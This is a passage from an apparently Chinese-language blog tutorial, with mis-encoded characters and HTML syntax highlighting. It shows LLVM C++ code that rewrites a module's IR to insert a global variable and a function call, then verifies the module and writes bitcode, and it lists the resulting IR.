punctuation">(</span>in_call_01<span class="token punctuation">,</span>in_alloc02<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">auto</span> in_load03 <span class="token operator">=</span> builder<span class="token punctuation">.</span><span class="token function">CreateLoad</span><span class="token punctuation">(</span>f32<span class="token punctuation">,</span>in_alloc02<span class="token punctuation">)</span><span class="token punctuation">;</span>    in_prt<span class="token operator">-></span><span class="token function">setOperand</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span>in_load03<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment">// M->print(outs(),nullptr);</span>    <span class="token comment">/**     * #include "llvm/IR/Verifier.h"     * 2022-05-02 11:43:34     * TODO:     * ä¿®æ”¹å®ŒModuleåè¿›è¡ŒéªŒè¯Moduleçš„å®Œæ•´æ€§     * verifyModule(*M,&amp;errs()): true if the module is broken.      * */</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>llvm<span class="token double-colon punctuation">::</span><span class="token function">verifyModule</span><span class="token punctuation">(</span><span class="token operator">*</span>M<span class="token punctuation">,</span><span class="token operator">&amp;</span><span class="token function">errs</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">outs</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">&lt;&lt;</span><span class="token string">"debug: Module verify is ok \n"</span><span class="token punctuation">;</span>        M<span class="token operator">-></span><span class="token function">print</span><span class="token punctuation">(</span><span class="token function">outs</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token keyword">nullptr</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">/**     * #include "llvm/Bitcode/BitcodeWriter.h"     * 2022-05-03 12:55:33     * TODO:     * å°†ä¿®æ”¹åçš„IR å­˜å‚¨åˆ°æ–‡ä»¶ä¸­ï¼Œ æ‰§è¡Œ     * */</span>    std<span class="token double-colon punctuation">::</span>error_code EC<span class="token punctuation">;</span>    llvm<span class="token double-colon punctuation">::</span>raw_fd_ostream <span class="token function">OS</span><span class="token punctuation">(</span><span class="token string">"aftermain2.bc"</span><span class="token punctuation">,</span> EC<span class="token punctuation">,</span>llvm<span class="token double-colon punctuation">::</span>sys<span class="token double-colon punctuation">::</span>fs<span class="token double-colon punctuation">::</span><span class="token function">OpenFlags</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    llvm<span class="token double-colon punctuation">::</span><span class="token function">WriteBitcodeToFile</span><span class="token punctuation">(</span><span class="token operator">*</span>M<span class="token punctuation">,</span>OS<span class="token punctuation">,</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    OS<span class="token punctuation">.</span><span class="token function">flush</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><h3 id="2-8-æ•ˆæœ-2">2.8) æ•ˆæœ</h3><p>ä¿®æ”¹åIRä»£ç å¦‚ä¸‹ï¼š</p><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token punctuation">;</span> ModuleID <span class="token operator">=</span> <span class="token string">'main.ll'</span>source_filename <span class="token operator">=</span> <span class="token string">"t.c"</span>target datalayout <span class="token operator">=</span> <span class="token string">"e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"</span>target triple <span class="token operator">=</span> <span class="token string">"x86_64-unknown-linux-gnu"</span><span class="token operator">%</span><span class="token keyword">struct</span><span class="token punctuation">.</span>_IO_FILE <span class="token operator">=</span> type <span class="token punctuation">&#123;</span> i32<span class="token punctuation">,</span> i8<span class="token operator">*</span><span class="token punctuation">,</span> i8<span class="token operator">*</span><span class="token punctuation">,</span> i8<span class="token operator">*</span><span class="token punctuation">,</span> i8<span class="token operator">*</span><span class="token punctuation">,</span> i8<span class="token operator">*</span><span class="token punctuation">,</span> i8<span class="token operator">*</span><span class="token punctuation">,</span> i8<span class="token operator">*</span><span class="token punctuation">,</span> i8<span class="token operator">*</span><span class="token punctuation">,</span> i8<span class="token operator">*</span><span class="token punctuation">,</span> i8<span class="token operator">*</span><span class="token punctuation">,</span> i8<span class="token operator">*</span><span class="token punctuation">,</span> <span class="token operator">%</span><span class="token keyword">struct</span><span class="token punctuation">.</span>_IO_marker<span class="token operator">*</span><span class="token punctuation">,</span> <span class="token operator">%</span><span class="token keyword">struct</span><span class="token punctuation">.</span>_IO_FILE<span class="token operator">*</span><span class="token punctuation">,</span> i32<span class="token punctuation">,</span> i32<span class="token punctuation">,</span> i64<span class="token punctuation">,</span> i16<span class="token punctuation">,</span> i8<span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">1</span> x i8<span class="token punctuation">]</span><span class="token punctuation">,</span> i8<span class="token operator">*</span><span class="token punctuation">,</span> i64<span class="token punctuation">,</span> <span class="token operator">%</span><span class="token keyword">struct</span><span class="token punctuation">.</span>_IO_codecvt<span class="token operator">*</span><span class="token punctuation">,</span> <span class="token operator">%</span><span class="token keyword">struct</span><span class="token punctuation">.</span>_IO_wide_data<span class="token operator">*</span><span class="token punctuation">,</span> <span class="token operator">%</span><span class="token keyword">struct</span><span class="token punctuation">.</span>_IO_FILE<span class="token operator">*</span><span class="token punctuation">,</span> i8<span class="token operator">*</span><span class="token punctuation">,</span> i64<span class="token punctuation">,</span> i32<span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">20</span> x i8<span class="token punctuation">]</span> <span class="token punctuation">&#125;</span><span class="token operator">%</span><span class="token keyword">struct</span><span class="token punctuation">.</span>_IO_marker <span class="token operator">=</span> type opaque<span class="token operator">%</span><span class="token keyword">struct</span><span class="token punctuation">.</span>_IO_codecvt <span class="token operator">=</span> type opaque<span class="token operator">%</span><span class="token keyword">struct</span><span class="token punctuation">.</span>_IO_wide_data <span class="token operator">=</span> type opaque@<span class="token punctuation">.</span>str <span class="token operator">=</span> <span class="token keyword">private</span> unnamed_addr constant <span class="token punctuation">[</span><span class="token number">22</span> x i8<span class="token punctuation">]</span> c<span class="token string">"plz input two numbers\00"</span><span class="token punctuation">,</span> align <span class="token number">1</span>@<span class="token constant">stdin</span> <span class="token operator">=</span> external dso_local global <span class="token operator">%</span><span class="token keyword">struct</span><span class="token punctuation">.</span>_IO_FILE<span class="token operator">*</span><span class="token punctuation">,</span> align <span class="token number">8</span>@<span class="token punctuation">.</span>str<span class="token punctuation">.</span><span class="token number">1</span> <span class="token operator">=</span> <span class="token keyword">private</span> unnamed_addr constant <span class="token punctuation">[</span><span class="token number">21</span> x i8<span class="token punctuation">]</span> c<span class="token string">"%.2f + %.2f = %.2f \0A\00"</span><span class="token punctuation">,</span> align <span class="token number">1</span><span class="token punctuation">;</span> Function Attrs<span class="token operator">:</span> noinline nounwind optnone uwtabledefine dso_local i32 @<span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> #<span class="token number">0</span> <span class="token punctuation">&#123;</span>  <span class="token operator">%</span><span class="token number">1</span> <span class="token operator">=</span> alloca i32<span class="token punctuation">,</span> align <span class="token number">4</span>  <span class="token operator">%</span><span class="token number">2</span> <span class="token operator">=</span> alloca i64<span class="token punctuation">,</span> align <span class="token number">8</span>  <span class="token operator">%</span><span class="token number">3</span> <span class="token operator">=</span> alloca i8<span class="token operator">*</span><span class="token punctuation">,</span> align <span class="token number">8</span>  <span class="token operator">%</span><span class="token number">4</span> <span class="token operator">=</span> alloca <span class="token keyword">double</span><span class="token punctuation">,</span> align <span class="token number">8</span>  <span class="token operator">%</span><span class="token number">5</span> <span class="token operator">=</span> alloca <span class="token keyword">double</span><span class="token punctuation">,</span> align <span class="token number">8</span>  store i32 <span class="token number">0</span><span class="token punctuation">,</span> i32<span class="token operator">*</span> <span class="token operator">%</span><span class="token number">1</span><span class="token punctuation">,</span> align <span class="token number">4</span>  <span class="token operator">%</span><span class="token number">6</span> <span class="token operator">=</span> call i32 @<span class="token function">puts</span><span class="token punctuation">(</span>i8<span class="token operator">*</span> noundef getelementptr <span class="token function">inbounds</span> <span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">22</span> x i8<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">22</span> x i8<span class="token punctuation">]</span><span class="token operator">*</span> @<span class="token punctuation">.</span>str<span class="token punctuation">,</span> i64 <span class="token number">0</span><span class="token punctuation">,</span> i64 <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  store i64 <span class="token number">100</span><span class="token punctuation">,</span> i64<span class="token operator">*</span> <span class="token operator">%</span><span class="token number">2</span><span class="token punctuation">,</span> align <span class="token number">8</span>  <span class="token operator">%</span><span class="token number">7</span> <span class="token operator">=</span> load i64<span class="token punctuation">,</span> i64<span class="token operator">*</span> <span class="token operator">%</span><span class="token number">2</span><span class="token punctuation">,</span> align <span class="token number">8</span>  <span class="token operator">%</span><span class="token number">8</span> <span class="token operator">=</span> call noalias i8<span class="token operator">*</span> @<span class="token function">malloc</span><span class="token punctuation">(</span>i64 noundef <span class="token operator">%</span><span class="token number">7</span><span class="token punctuation">)</span> #<span class="token number">4</span>  store i8<span class="token operator">*</span> <span class="token operator">%</span><span class="token number">8</span><span class="token punctuation">,</span> i8<span class="token operator">*</span><span class="token operator">*</span> <span class="token operator">%</span><span class="token number">3</span><span class="token punctuation">,</span> align <span class="token number">8</span>  <span class="token operator">%</span><span class="token number">9</span> <span class="token operator">=</span> load <span class="token operator">%</span><span class="token keyword">struct</span><span class="token punctuation">.</span>_IO_FILE<span class="token operator">*</span><span class="token punctuation">,</span> <span class="token operator">%</span><span class="token keyword">struct</span><span class="token punctuation">.</span>_IO_FILE<span class="token operator">*</span><span class="token operator">*</span> @<span class="token constant">stdin</span><span class="token punctuation">,</span> align <span class="token number">8</span>  <span class="token operator">%</span><span class="token number">10</span> <span class="token operator">=</span> call i64 @<span class="token function">getline</span><span class="token punctuation">(</span>i8<span class="token operator">*</span><span class="token operator">*</span> noundef <span class="token operator">%</span><span class="token number">3</span><span class="token punctuation">,</span> i64<span class="token operator">*</span> noundef <span class="token operator">%</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token operator">%</span><span class="token keyword">struct</span><span class="token punctuation">.</span>_IO_FILE<span class="token operator">*</span> noundef <span class="token operator">%</span><span class="token number">9</span><span class="token punctuation">)</span>  <span class="token operator">%</span><span class="token number">11</span> <span class="token operator">=</span> load i8<span class="token operator">*</span><span class="token punctuation">,</span> i8<span class="token operator">*</span><span class="token operator">*</span> <span class="token operator">%</span><span class="token number">3</span><span class="token punctuation">,</span> align <span class="token number">8</span>  <span class="token operator">%</span><span class="token number">12</span> <span class="token operator">=</span> call <span class="token keyword">double</span> @<span class="token function">atof</span><span class="token punctuation">(</span>i8<span class="token operator">*</span> noundef <span class="token operator">%</span><span class="token number">11</span><span class="token punctuation">)</span> #<span class="token number">5</span>  store <span class="token keyword">double</span> <span class="token operator">%</span><span class="token number">12</span><span class="token punctuation">,</span> <span class="token keyword">double</span><span class="token operator">*</span> <span class="token operator">%</span><span class="token number">4</span><span class="token punctuation">,</span> align <span class="token number">8</span>  <span class="token operator">%</span><span class="token number">13</span> <span class="token operator">=</span> load <span class="token operator">%</span><span class="token keyword">struct</span><span class="token punctuation">.</span>_IO_FILE<span class="token operator">*</span><span class="token punctuation">,</span> <span class="token operator">%</span><span class="token keyword">struct</span><span class="token punctuation">.</span>_IO_FILE<span class="token operator">*</span><span class="token operator">*</span> @<span class="token constant">stdin</span><span class="token punctuation">,</span> align <span class="token number">8</span>  <span class="token operator">%</span><span class="token number">14</span> <span class="token operator">=</span> call i64 @<span class="token function">getline</span><span class="token punctuation">(</span>i8<span class="token operator">*</span><span class="token operator">*</span> noundef <span class="token operator">%</span><span class="token number">3</span><span class="token punctuation">,</span> i64<span class="token operator">*</span> noundef <span class="token operator">%</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token operator">%</span><span class="token keyword">struct</span><span class="token punctuation">.</span>_IO_FILE<span class="token operator">*</span> noundef <span class="token operator">%</span><span class="token number">13</span><span class="token punctuation">)</span>  <span class="token operator">%</span><span class="token number">15</span> <span class="token operator">=</span> load i8<span class="token operator">*</span><span class="token punctuation">,</span> i8<span class="token operator">*</span><span class="token operator">*</span> <span class="token operator">%</span><span class="token number">3</span><span class="token punctuation">,</span> align <span class="token number">8</span>  <span class="token operator">%</span><span class="token number">16</span> <span class="token operator">=</span> call <span class="token keyword">double</span> @<span class="token function">atof</span><span class="token punctuation">(</span>i8<span class="token operator">*</span> noundef <span class="token operator">%</span><span class="token number">15</span><span class="token punctuation">)</span> #<span class="token number">5</span>  store <span class="token keyword">double</span> <span class="token operator">%</span><span class="token number">16</span><span class="token punctuation">,</span> <span class="token keyword">double</span><span class="token operator">*</span> <span class="token operator">%</span><span class="token number">5</span><span class="token punctuation">,</span> align <span class="token number">8</span>  <span class="token operator">%</span><span class="token number">17</span> <span class="token operator">=</span> load <span class="token keyword">double</span><span class="token punctuation">,</span> <span class="token keyword">double</span><span class="token operator">*</span> <span class="token operator">%</span><span class="token number">4</span><span class="token punctuation">,</span> align <span class="token number">8</span>  <span class="token operator">%</span><span class="token number">18</span> <span class="token operator">=</span> load <span class="token keyword">double</span><span class="token punctuation">,</span> <span class="token keyword">double</span><span class="token operator">*</span> <span class="token operator">%</span><span class="token number">5</span><span class="token punctuation">,</span> align <span class="token number">8</span>  <span class="token operator">%</span><span class="token number">19</span> <span class="token operator">=</span> load <span class="token keyword">double</span><span class="token punctuation">,</span> <span class="token keyword">double</span><span class="token operator">*</span> <span class="token operator">%</span><span class="token number">4</span><span class="token punctuation">,</span> align <span class="token number">8</span>  <span class="token operator">%</span><span class="token number">20</span> <span class="token operator">=</span> load <span class="token keyword">double</span><span class="token punctuation">,</span> <span class="token keyword">double</span><span class="token operator">*</span> <span class="token operator">%</span><span class="token number">5</span><span class="token punctuation">,</span> align <span class="token number">8</span>  <span class="token operator">%</span><span class="token number">21</span> <span class="token operator">=</span> fadd <span class="token keyword">double</span> <span class="token operator">%</span><span class="token number">19</span><span class="token punctuation">,</span> <span class="token operator">%</span><span class="token number">20</span>  <span class="token operator">%</span>ia01 <span class="token operator">=</span> alloca <span class="token keyword">double</span><span class="token punctuation">,</span> align <span class="token number">8</span>  <span class="token operator">%</span><span class="token number">22</span> <span class="token operator">=</span> call <span class="token keyword">double</span> <span class="token punctuation">(</span><span class="token keyword">double</span><span class="token punctuation">,</span> <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">)</span> @<span class="token function">work03_fn</span><span class="token punctuation">(</span><span class="token keyword">double</span> <span class="token operator">%</span><span class="token number">21</span><span class="token punctuation">)</span>  store <span class="token keyword">double</span> <span class="token operator">%</span><span class="token number">22</span><span class="token punctuation">,</span> <span class="token keyword">double</span><span class="token operator">*</span> <span class="token operator">%</span>ia01<span class="token punctuation">,</span> align <span class="token number">8</span>  <span class="token operator">%</span><span class="token number">23</span> <span class="token operator">=</span> load <span class="token keyword">double</span><span class="token punctuation">,</span> <span class="token keyword">double</span><span class="token operator">*</span> <span class="token operator">%</span>ia01<span class="token punctuation">,</span> align <span class="token number">8</span>  <span class="token operator">%</span><span class="token number">24</span> <span class="token operator">=</span> call <span class="token function">i32</span> <span class="token punctuation">(</span>i8<span class="token operator">*</span><span class="token punctuation">,</span> <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">)</span> @<span class="token function">printf</span><span class="token punctuation">(</span>i8<span class="token operator">*</span> noundef getelementptr <span class="token function">inbounds</span> <span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">21</span> x i8<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">21</span> x i8<span class="token punctuation">]</span><span class="token operator">*</span> @<span class="token punctuation">.</span>str<span class="token punctuation">.</span><span class="token number">1</span><span class="token punctuation">,</span> i64 <span class="token number">0</span><span class="token punctuation">,</span> i64 <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token keyword">double</span> noundef <span class="token operator">%</span><span class="token number">17</span><span class="token punctuation">,</span> <span class="token keyword">double</span> noundef <span class="token operator">%</span><span class="token number">18</span><span class="token punctuation">,</span> <span class="token keyword">double</span> noundef <span class="token operator">%</span><span class="token number">23</span><span class="token punctuation">)</span>  <span class="token operator">%</span><span class="token number">25</span> <span class="token operator">=</span> load i8<span class="token operator">*</span><span class="token punctuation">,</span> i8<span class="token operator">*</span><span class="token operator">*</span> <span class="token operator">%</span><span class="token number">3</span><span class="token punctuation">,</span> align <span class="token number">8</span>  call <span class="token keyword">void</span> @<span class="token function">free</span><span class="token punctuation">(</span>i8<span class="token operator">*</span> noundef <span class="token operator">%</span><span class="token number">25</span><span class="token punctuation">)</span> #<span class="token number">4</span>  ret i32 <span class="token number">0</span><span class="token punctuation">&#125;</span>declare dso_local i32 @<span class="token function">puts</span><span class="token punctuation">(</span>i8<span class="token operator">*</span> noundef<span class="token punctuation">)</span> #<span class="token number">1</span><span class="token punctuation">;</span> Function Attrs<span class="token operator">:</span> nounwinddeclare dso_local noalias i8<span class="token operator">*</span> @<span class="token function">malloc</span><span class="token punctuation">(</span>i64 noundef<span class="token punctuation">)</span> #<span class="token number">2</span>declare dso_local i64 @<span class="token function">getline</span><span class="token punctuation">(</span>i8<span class="token operator">*</span><span class="token operator">*</span> noundef<span class="token punctuation">,</span> i64<span class="token operator">*</span> noundef<span class="token punctuation">,</span> <span class="token operator">%</span><span class="token keyword">struct</span><span class="token punctuation">.</span>_IO_FILE<span class="token operator">*</span> noundef<span class="token punctuation">)</span> #<span class="token number">1</span><span class="token punctuation">;</span> Function Attrs<span class="token operator">:</span> nounwind readonly willreturndeclare dso_local <span class="token keyword">double</span> @<span class="token function">atof</span><span class="token punctuation">(</span>i8<span class="token operator">*</span> noundef<span class="token punctuation">)</span> #<span class="token number">3</span>declare dso_local i32 @<span class="token function">printf</span><span class="token punctuation">(</span>i8<span class="token operator">*</span> noundef<span class="token punctuation">,</span> <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">)</span> #<span class="token number">1</span><span class="token punctuation">;</span> Function Attrs<span class="token operator">:</span> nounwinddeclare dso_local <span class="token keyword">void</span> @<span class="token function">free</span><span class="token punctuation">(</span>i8<span class="token operator">*</span> noundef<span class="token punctuation">)</span> #<span class="token number">2</span>define <span class="token keyword">double</span> @<span class="token function">work03_fn</span><span class="token punctuation">(</span><span class="token keyword">double</span> <span class="token operator">%</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>work03_fn_defaut<span class="token operator">:</span>  <span class="token operator">%</span>ial02 <span class="token operator">=</span> alloca <span class="token keyword">double</span><span class="token punctuation">,</span> align <span class="token number">8</span>  store <span class="token keyword">double</span> <span class="token operator">%</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token keyword">double</span><span class="token operator">*</span> <span class="token operator">%</span>ial02<span class="token punctuation">,</span> align <span class="token number">8</span>  <span class="token operator">%</span><span class="token number">1</span> <span class="token operator">=</span> load <span class="token keyword">double</span><span class="token punctuation">,</span> <span class="token keyword">double</span><span class="token operator">*</span> <span class="token operator">%</span>ial02<span class="token punctuation">,</span> align <span class="token number">8</span>  <span class="token operator">%</span><span class="token number">2</span> <span class="token operator">=</span> fcmp ugt <span class="token keyword">double</span> <span class="token operator">%</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1.000000e+02</span>  br i1 <span class="token operator">%</span><span class="token number">2</span><span class="token punctuation">,</span> label <span class="token operator">%</span>work03_fn_change<span class="token punctuation">,</span> label <span class="token operator">%</span>work03_fn_nothingwork03_fn_change<span class="token operator">:</span>                                 <span class="token punctuation">;</span> preds <span class="token operator">=</span> <span class="token operator">%</span>work03_fn_defaut  <span class="token operator">%</span><span class="token number">3</span> <span class="token operator">=</span> load <span class="token keyword">double</span><span class="token punctuation">,</span> <span class="token keyword">double</span><span class="token operator">*</span> <span class="token operator">%</span>ial02<span class="token punctuation">,</span> align <span class="token number">8</span>  <span class="token operator">%</span><span class="token number">4</span> <span class="token operator">=</span> frem <span class="token keyword">double</span> <span class="token operator">%</span><span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">1.000000e+02</span>  store <span class="token keyword">double</span> <span class="token operator">%</span><span class="token number">4</span><span class="token punctuation">,</span> <span class="token keyword">double</span><span class="token operator">*</span> <span class="token operator">%</span>ial02<span class="token punctuation">,</span> align <span class="token number">8</span>  <span class="token operator">%</span><span class="token number">5</span> <span class="token operator">=</span> load <span class="token keyword">double</span><span class="token punctuation">,</span> <span class="token keyword">double</span><span class="token operator">*</span> <span class="token operator">%</span>ial02<span class="token punctuation">,</span> align <span class="token number">8</span>  ret <span class="token keyword">double</span> <span class="token operator">%</span><span class="token number">5</span>work03_fn_nothing<span class="token operator">:</span>                                <span class="token punctuation">;</span> preds <span class="token operator">=</span> <span class="token operator">%</span>work03_fn_defaut  <span class="token operator">%</span><span class="token number">6</span> <span class="token operator">=</span> load <span class="token keyword">double</span><span class="token punctuation">,</span> <span class="token keyword">double</span><span class="token operator">*</span> <span class="token operator">%</span>ial02<span class="token punctuation">,</span> align <span class="token number">8</span>  ret <span class="token keyword">double</span> <span class="token operator">%</span><span class="token number">6</span><span class="token punctuation">&#125;</span>attributes #<span class="token number">0</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span> noinline nounwind optnone uwtable <span class="token string">"frame-pointer"</span><span class="token operator">=</span><span class="token string">"all"</span> <span class="token string">"min-legal-vector-width"</span><span class="token operator">=</span><span class="token string">"0"</span> <span class="token string">"no-trapping-math"</span><span class="token operator">=</span><span class="token string">"true"</span> <span class="token string">"stack-protector-buffer-size"</span><span class="token operator">=</span><span class="token string">"8"</span> <span class="token string">"target-cpu"</span><span class="token operator">=</span><span class="token string">"x86-64"</span> <span class="token string">"target-features"</span><span class="token operator">=</span><span class="token string">"+cx8,+fxsr,+mmx,+sse,+sse2,+x87"</span> <span class="token string">"tune-cpu"</span><span class="token operator">=</span><span class="token string">"generic"</span> <span class="token punctuation">&#125;</span>attributes #<span class="token number">1</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span> <span class="token string">"frame-pointer"</span><span class="token operator">=</span><span class="token string">"all"</span> <span class="token string">"no-trapping-math"</span><span class="token operator">=</span><span class="token string">"true"</span> <span class="token string">"stack-protector-buffer-size"</span><span class="token operator">=</span><span class="token string">"8"</span> <span class="token string">"target-cpu"</span><span class="token operator">=</span><span class="token string">"x86-64"</span> <span class="token string">"target-features"</span><span class="token operator">=</span><span class="token string">"+cx8,+fxsr,+mmx,+sse,+sse2,+x87"</span> <span class="token string">"tune-cpu"</span><span class="token operator">=</span><span class="token string">"generic"</span> <span class="token punctuation">&#125;</span>attributes #<span class="token number">2</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span> nounwind <span class="token string">"frame-pointer"</span><span class="token operator">=</span><span class="token string">"all"</span> <span class="token string">"no-trapping-math"</span><span class="token operator">=</span><span class="token string">"true"</span> <span class="token string">"stack-protector-buffer-size"</span><span class="token operator">=</span><span class="token string">"8"</span> <span class="token string">"target-cpu"</span><span class="token operator">=</span><span class="token string">"x86-64"</span> <span class="token string">"target-features"</span><span class="token operator">=</span><span class="token string">"+cx8,+fxsr,+mmx,+sse,+sse2,+x87"</span> <span class="token string">"tune-cpu"</span><span class="token operator">=</span><span class="token string">"generic"</span> <span class="token punctuation">&#125;</span>attributes #<span class="token number">3</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span> nounwind readonly willreturn <span class="token string">"frame-pointer"</span><span class="token operator">=</span><span class="token string">"all"</span> <span class="token string">"no-trapping-math"</span><span class="token operator">=</span><span class="token string">"true"</span> <span class="token string">"stack-protector-buffer-size"</span><span class="token operator">=</span><span class="token string">"8"</span> <span class="token string">"target-cpu"</span><span class="token operator">=</span><span class="token string">"x86-64"</span> <span class="token string">"target-features"</span><span class="token operator">=</span><span class="token string">"+cx8,+fxsr,+mmx,+sse,+sse2,+x87"</span> <span class="token string">"tune-cpu"</span><span class="token operator">=</span><span class="token string">"generic"</span> <span class="token punctuation">&#125;</span>attributes #<span class="token number">4</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span> nounwind <span class="token punctuation">&#125;</span>attributes #<span class="token number">5</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span> nounwind readonly willreturn <span class="token punctuation">&#125;</span><span class="token operator">!</span>llvm<span class="token punctuation">.</span><span class="token keyword">module</span><span class="token punctuation">.</span>flags <span class="token operator">=</span> <span class="token operator">!</span><span class="token punctuation">&#123;</span><span class="token operator">!</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token operator">!</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token operator">!</span><span class="token number">2</span><span class="token punctuation">&#125;</span><span class="token operator">!</span>llvm<span class="token punctuation">.</span>ident <span class="token operator">=</span> <span class="token operator">!</span><span class="token punctuation">&#123;</span><span class="token operator">!</span><span class="token number">3</span><span class="token punctuation">&#125;</span><span class="token operator">!</span><span class="token number">0</span> <span class="token operator">=</span> <span class="token operator">!</span><span class="token punctuation">&#123;</span>i32 <span class="token number">1</span><span class="token punctuation">,</span> <span class="token operator">!</span><span class="token string">"wchar_size"</span><span class="token punctuation">,</span> i32 <span class="token number">4</span><span class="token punctuation">&#125;</span><span class="token operator">!</span><span class="token number">1</span> <span class="token operator">=</span> <span class="token operator">!</span><span class="token punctuation">&#123;</span>i32 <span class="token number">7</span><span class="token punctuation">,</span> <span class="token operator">!</span><span class="token string">"uwtable"</span><span class="token punctuation">,</span> i32 <span class="token number">1</span><span class="token punctuation">&#125;</span><span class="token operator">!</span><span class="token number">2</span> <span class="token operator">=</span> <span class="token operator">!</span><span class="token punctuation">&#123;</span>i32 <span class="token number">7</span><span class="token punctuation">,</span> <span class="token operator">!</span><span class="token string">"frame-pointer"</span><span class="token punctuation">,</span> i32 <span class="token number">2</span><span class="token punctuation">&#125;</span><span class="token operator">!</span><span class="token number">3</span> <span class="token operator">=</span> <span class="token operator">!</span><span class="token punctuation">&#123;</span><span class="token operator">!</span><span class="token string">"clang version 14.0.0"</span><span class="token punctuation">&#125;</span></code></pre><p><img src="https://s2.loli.net/2022/05/03/8yOIbce5SskDQ3H.png" class="lazyload" data-srcset="https://s2.loli.net/2022/05/03/8yOIbce5SskDQ3H.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20220503220827827"></p></div><h2 id="å››-æ€»ç»“">å››) æ€»ç»“</h2><div class="story post-story"><ol><li>æ¶‰åŠåˆ°åˆ›å»ºå…¨å±€å˜é‡æ“ä½œ, <font color='red'>åˆ›å»ºæ—¶éœ€è¦åˆå§‹åŒ–å…¶å€¼ã€‚</font></li></ol><p>ä¸€ç§æ—¶ç›´æ¥æ„é€ åˆ›å»ºï¼Œæˆ–ä½¿ç”¨Moduleç±»ä¸­<code>getOrInsertGlobal</code>æ–¹æ³•ã€‚</p><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">auto</span> in_alloc02 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token function">GlobalVariable</span><span class="token punctuation">(</span><span class="token operator">*</span>M<span class="token punctuation">,</span>f32<span class="token punctuation">,</span><span class="token boolean">false</span><span class="token punctuation">,</span>GlobalValue<span class="token double-colon punctuation">::</span>PrivateLinkage<span class="token punctuation">,</span>const_0<span class="token punctuation">,</span><span class="token string">"fadd_res"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">GlobalVariable</span><span class="token double-colon punctuation">::</span><span class="token function">GlobalVariable</span><span class="token punctuation">(</span>Module <span class="token operator">&amp;</span>M<span class="token punctuation">,</span> Type <span class="token operator">*</span>Ty<span class="token punctuation">,</span> <span class="token keyword">bool</span> constant<span class="token punctuation">,</span>                               LinkageTypes Link<span class="token punctuation">,</span> Constant <span class="token operator">*</span>InitVal<span class="token punctuation">,</span>                               <span class="token keyword">const</span> Twine <span class="token operator">&amp;</span>Name<span class="token punctuation">,</span> GlobalVariable <span class="token operator">*</span>Before<span class="token punctuation">,</span>                               ThreadLocalMode TLMode<span class="token punctuation">,</span>                               Optional<span class="token operator">&lt;</span><span class="token keyword">unsigned</span><span class="token operator">></span> AddressSpace<span class="token punctuation">,</span>                               <span class="token keyword">bool</span> isExternallyInitialized<span class="token punctuation">)</span><span class="token comment">// Overload to construct a global variable using its constructor's defaults.</span>Constant <span class="token operator">*</span><span class="token class-name">Module</span><span class="token double-colon punctuation">::</span><span class="token function">getOrInsertGlobal</span><span class="token punctuation">(</span>StringRef Name<span class="token punctuation">,</span> Type <span class="token operator">*</span>Ty<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">return</span> <span class="token function">getOrInsertGlobal</span><span class="token punctuation">(</span>Name<span class="token punctuation">,</span> Ty<span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token operator">&amp;</span><span class="token punctuation">]</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token function">GlobalVariable</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token keyword">this</span><span class="token punctuation">,</span> Ty<span class="token punctuation">,</span> <span class="token boolean">false</span><span 